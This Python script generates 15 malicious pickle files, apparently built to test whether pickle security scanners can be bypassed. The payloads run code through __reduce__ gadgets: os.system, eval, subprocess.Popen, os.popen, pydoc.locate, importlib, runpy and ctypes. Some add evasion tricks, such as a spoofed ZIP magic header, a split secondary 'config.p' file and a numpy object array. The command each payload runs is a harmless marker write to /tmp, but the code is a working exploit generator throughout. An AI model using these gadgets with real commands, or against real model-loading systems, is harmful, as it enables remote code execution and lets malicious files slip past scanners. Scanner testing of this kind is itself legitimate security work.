import os
import pickle
import sys

def generate_parser_bypasses(output_dir):
    os.makedirs(output_dir, exist_ok=True)
    print(f"[*] Generating 15 parser logic bypasses in {output_dir}...")

    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, ('echo "RCE_PROOF" > /tmp/fuzzpickle_pwned',))

    # 1. STACK_GLOBAL Index 0 Bypass
    with open(os.path.join(output_dir, "01_stack_global.pkl"), "wb") as f:
        pickle.dump(MaliciousPayload(), f)
        
    # 2. Exception-Directed Programming (EDP)
    with open(os.path.join(output_dir, "02_edp_crash.pkl"), "wb") as f:
        f.write(b"(S'echo \"RCE_PROOF\" > /tmp/fuzzpickle_pwned'\nios\nsystem\n.")

    # 3. Magic Number Spoofing
    with open(os.path.join(output_dir, "03_magic_spoof.pkl"), "wb") as f:
        f.write(b"PK\x03\x04")
        pickle.dump(MaliciousPayload(), f)

    # 4. The 'config.p' Parameter Trick
    with open(os.path.join(output_dir, "04_secondary_file.pkl"), "wb") as f:
        pickle.dump({"safe": "data"}, f)
    with open(os.path.join(output_dir, "04_config.p"), "wb") as f:
        pickle.dump(MaliciousPayload(), f)

    # 5. pydoc.locate Gadget
    with open(os.path.join(output_dir, "05_pydoc_gadget.pkl"), "wb") as f:
        class PydocBypass:
            def __reduce__(self):
                import pydoc
                return (pydoc.locate('os.system'), ('echo "RCE_PROOF" > /tmp/fuzzpickle_pwned',))
        pickle.dump(PydocBypass(), f)

    # 6. importlib + operator.methodcaller
    with open(os.path.join(output_dir, "06_importlib.pkl"), "wb") as f:
        class ImportlibBypass:
            def __reduce__(self):
                payload = "import importlib, operator; operator.methodcaller('system', 'echo \"RCE_PROOF\" > /tmp/fuzzpickle_pwned')(importlib.import_module('os'))"
                return (eval, (payload,))
        pickle.dump(ImportlibBypass(), f)

    # 7. builtins eval bypass
    with open(os.path.join(output_dir, "07_eval.pkl"), "wb") as f:
        class EvalBypass:
            def __reduce__(self):
                return (eval, ('__import__("os").system("echo RCE_PROOF > /tmp/fuzzpickle_pwned")',))
        pickle.dump(EvalBypass(), f)

    # 8. codecs.open
    with open(os.path.join(output_dir, "08_codecs_open.pkl"), "wb") as f:
        class CodecsBypass:
            def __reduce__(self):
                import codecs
                return (codecs.open, ('/tmp/fuzzpickle_pwned', 'w'))
        pickle.dump(CodecsBypass(), f)

    # 9. io.open
    with open(os.path.join(output_dir, "09_io_open.pkl"), "wb") as f:
        class IoBypass:
            def __reduce__(self):
                import io
                return (io.open, ('/tmp/fuzzpickle_pwned', 'w'))
        pickle.dump(IoBypass(), f)

    # 10. os.popen
    with open(os.path.join(output_dir, "10_os_popen.pkl"), "wb") as f:
        class PopenBypass:
            def __reduce__(self):
                return (os.popen, ('echo "RCE_PROOF" > /tmp/fuzzpickle_pwned',))
        pickle.dump(PopenBypass(), f)

    # 11. subprocess.Popen
    with open(os.path.join(output_dir, "11_subprocess.pkl"), "wb") as f:
        class SubprocessBypass:
            def __reduce__(self):
                import subprocess
                return (subprocess.Popen, (['sh', '-c', 'echo "RCE_PROOF" > /tmp/fuzzpickle_pwned'],))
        pickle.dump(SubprocessBypass(), f)

    # 12. runpy
    with open(os.path.join(output_dir, "12_runpy.pkl"), "wb") as f:
        class RunpyBypass:
            def __reduce__(self):
                import runpy
                return (runpy.run_path, ('/tmp/fuzzpickle_pwned',))
        pickle.dump(RunpyBypass(), f)

    # 13. pickle.loads recursion
    with open(os.path.join(output_dir, "13_recursive.pkl"), "wb") as f:
        class RecursiveBypass:
            def __reduce__(self):
                return (pickle.loads, (pickle.dumps(MaliciousPayload()),))
        pickle.dump(RecursiveBypass(), f)

    # 14. ctypes
    with open(os.path.join(output_dir, "14_ctypes.pkl"), "wb") as f:
        class CtypesBypass:
            def __reduce__(self):
                import ctypes
                return (ctypes.CDLL, ('libc.so.6',))
        pickle.dump(CtypesBypass(), f)

    # 15. numpy object dtype
    try:
        import numpy as np
        arr = np.array([MaliciousPayload()], dtype=object)
        np.save(os.path.join(output_dir, "15_numpy_object.npy"), arr, allow_pickle=True)
    except ImportError:
        print("[-] Numpy not installed. Skipping Type 15.")

    print("[+] Successfully generated 15 parser bypass payloads.")

if __name__ == "__main__":
    output_dir = sys.argv[1] if len(sys.argv) > 1 else "fuzz_files/scan_payloads"
    generate_parser_bypasses(output_dir)
